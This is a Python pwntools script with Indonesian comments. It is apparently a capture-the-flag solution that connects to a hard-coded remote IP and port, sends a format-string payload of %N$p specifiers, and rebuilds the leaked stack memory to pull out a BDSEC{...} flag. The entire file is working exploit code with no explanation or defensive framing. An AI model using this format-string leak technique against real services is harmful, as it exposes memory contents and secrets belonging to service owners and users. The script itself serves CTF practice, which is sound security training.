from pwn import *

# --- Detail Koneksi ---
host = '45.33.118.86'
port = 9992

# --- Fungsi Utama ---
def get_flag_updated():
    """
    Menghubungkan ke server, mengirim payload format string yang diperluas,
    dan memproses memori yang bocor untuk menemukan flag.
    """
    log.info(f"Menghubungkan ke {host}:{port}...")
    try:
        p = remote(host, port)
        p.recvuntil(b"Enter your input: ")
    except PwnlibException as e:
        log.failure(f"Gagal terhubung: {e}")
        return

    # --- PERUBAHAN 1: Jangkauan diperluas hingga 100 untuk mencakup lebih banyak area stack ---
    payload = b""
    for i in range(6, 100):
        # --- PERUBAHAN 2: Menggunakan %p yang lebih robust dan dipisahkan oleh titik ---
        payload += b"%" + str(i).encode() + b"$p."
    
    log.info("Mengirim payload yang diperbarui...")
    p.sendline(payload)

    p.recvuntil(b"Buzz says: ")
    leak = p.recvline().decode().strip()
    p.close()
    log.success("Berhasil menerima data yang bocor!")

    log.info("Memproses data...")
    # Pisahkan berdasarkan '.'
    leaked_parts = leak.split('.')
    reconstructed_memory = b""

    for part in leaked_parts:
        # Cek jika ini adalah alamat memori (dimulai dengan 0x)
        if part.startswith("0x"):
            try:
                # Hapus "0x" dan ubah ke integer
                hex_val = int(part, 16)
                # Pikirkan ukuran pointer (coba 8 byte untuk 64-bit, jika gagal coba 4 byte)
                try:
                    reconstructed_memory += p64(hex_val)
                except struct.error:
                    reconstructed_memory += p32(hex_val)
            except (ValueError, struct.error):
                continue
    
    # Cari pola flag
    try:
        decoded_string = reconstructed_memory.decode('latin-1')
        flag_start = decoded_string.find("BDSEC{")
        if flag_start != -1:
            flag_end = decoded_string.find("}", flag_start)
            if flag_end != -1:
                flag = decoded_string[flag_start : flag_end + 1]
                log.success(f"Flag ditemukan: {flag}")
                return flag
        
        log.failure("Pola flag masih tidak ditemukan.")
        # --- PERUBAHAN 3: Cetak semua hasil dekode untuk debug manual ---
        print("\n--- HASIL DEKODE LENGKAP UNTUK DEBUG ---")
        print(decoded_string)
        print("------------------------------------------")
        return None

    except UnicodeDecodeError:
        log.failure("Gagal mendekode memori yang direkonstruksi.")
        return None

# --- Jalankan Skrip ---
if __name__ == "__main__":
    get_flag_updated()
